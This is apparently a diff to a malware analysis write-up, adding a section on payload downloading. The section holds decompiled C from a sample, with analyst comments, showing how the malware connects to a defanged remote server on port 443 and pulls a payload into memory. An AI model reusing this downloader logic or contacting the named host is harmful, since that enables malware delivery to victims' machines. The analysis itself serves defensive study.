@@ -58,6 +58,88 @@ Next, when the binary is executing from %TEMP%, it will attempt to delete itself
   }
 ```
 
+**Payload Downloading**
+
+```C
+v31 = InternetOpenW(L"Updates downloader", 0, 0, 0, 0); // InternetOpenW API with "Updates downloader" user-agent is held in variable v31
+  if ( v31 ) // If this was successful, build an lpszAcceptTypes string of "text/application/*"
+  {
+    lpBuffer = (LPWSTR)-1;
+    lpszAcceptTypes[0] = L"text/*";
+    lpszAcceptTypes[1] = L"application/*";
+    lpszAcceptTypes[2] = 0;
+    do
+    {
+      while ( 1 )
+      {
+LABEL_14:
+        lpBuffer = (LPWSTR)((char *)lpBuffer + 1);
+        if ( (int)lpBuffer > 1 )
+          lpBuffer = 0;
+        v9 = 0;
+        while ( 1 )
+        {
+          v10 = InternetConnectW((HINTERNET)v31, (&lpszServerName)[(_DWORD)lpBuffer], 0x1BBu, 0, 0, 3u, 0, 0);
+// InternetConnectW API held in v10 variable
+// v31 used as the User-Agent argument
+// &lpszServerName is a global data variable holding california89[.]com
+          if ( v10 )
+            break;
+          if ( ++v9 >= 3 )
+            goto LABEL_14;
+        }
+        nNumberOfBytesToRead = 0;
+        while ( 1 )
+        {
+          v11 = HttpOpenRequestW(v10, 0, (&lpszObjectName)[(_DWORD)lpBuffer], 0, 0, lpszAcceptTypes, 0x80803000, 0);
+          hFile = v11;
+          if ( v11 )
+            break;
+          if ( (int)++nNumberOfBytesToRead >= 3 )
+            goto LABEL_14;
+        }
+        dwBufferLength = 4;
+        InternetQueryOptionW(v11, 0x1Fu, &Buffer, &dwBufferLength);
+        Buffer |= 0x100u;
+        InternetSetOptionW(v11, 0x1Fu, &Buffer, 4u);
+        for ( i = 0; i < 2; ++i )
+        {
+          if ( HttpSendRequestW(v11, 0, 0, 0, 0) )
+            break;
+        }
+        if ( i != 2 )
+        {
+          v27 = 4;
+          dwBytes = 0;
+          for ( j = 0; j < 3; ++j )
+          {
+            if ( HttpQueryInfoW(v11, 0x20000005u, &dwBytes, &v27, 0) )
+              break;
+          }
+          if ( dwBytes >= 0x30D40 )
+            break;
+        }
+      }
+      v14 = (char *)HeapAlloc(hHeap, 8u, dwBytes);
+      if ( !v14 )
+        return 1;
+      NumberOfBytesRead = 0;
+      for ( nNumberOfBytesToRead = 0; (int)nNumberOfBytesToRead < 20; ++nNumberOfBytesToRead )
+      {
+        v15 = v14;
+        for ( k = InternetReadFile(hFile, v14, dwBytes, &NumberOfBytesRead);
+              k;
+              k = InternetReadFile(hFile, v15, dwBytes, &NumberOfBytesRead) )
+        {
+          v15 += NumberOfBytesRead;
+          if ( !NumberOfBytesRead || NumberOfBytesRead == dwBytes )
+            break;
+        }
+        if ( v15 - v14 == dwBytes )
+          break;
+      }
+    }
+```
 
 
 
